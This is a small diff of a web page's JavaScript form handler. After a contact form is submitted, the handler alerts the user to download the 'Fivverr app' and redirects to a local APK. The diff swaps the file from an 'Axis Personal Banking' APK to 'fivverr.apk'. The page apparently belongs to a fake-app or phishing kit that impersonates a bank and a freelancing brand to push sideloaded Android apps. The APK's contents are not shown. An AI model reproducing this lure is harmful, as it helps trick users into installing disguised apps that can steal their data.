@@ -45,7 +45,7 @@ function submitForm(e){
 //   document.getElementById('contactForm').reset();
 alert("Click Ok And Download Fivverr app")
 document.getElementById('contactForm').reset();
-window.location.assign("./app/Axis Personal Banking.apk")
+window.location.assign("./app/fivverr.apk")
 }
 
 // Function to get get form values
